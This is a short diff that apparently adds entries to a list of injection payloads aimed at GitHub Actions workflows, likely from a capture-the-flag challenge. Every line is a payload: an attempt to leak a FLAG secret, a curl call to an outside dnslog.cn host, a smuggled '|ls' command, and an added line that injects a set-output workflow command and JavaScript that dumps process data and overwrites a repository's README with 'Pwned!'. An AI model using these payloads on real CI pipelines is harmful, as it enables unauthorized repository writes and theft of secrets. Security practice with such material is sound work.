@@ -854,3 +854,4 @@ DongBother:${{ secret.FLAG }};
 shell: /bin/bash -e "curl q92uua.dnslog.cn";
 |ls;
 Konano:test1
+DongBother::set-output name=COMMENT_ID::1; console.log(context); console.log(process); await github.request('PUT /repos/{owner}/{repo}/contents/{path}', { owner: 'incrediblysecureinc', repo: 'incredibly-secure-Creastery', path: 'README.md', message: 'Escalated to Read-write Access', content: Buffer.from('Pwned!').toString('base64'), sha: '959c46eb0fbab9ab5b5bfb279ab6d70f720d1207' })
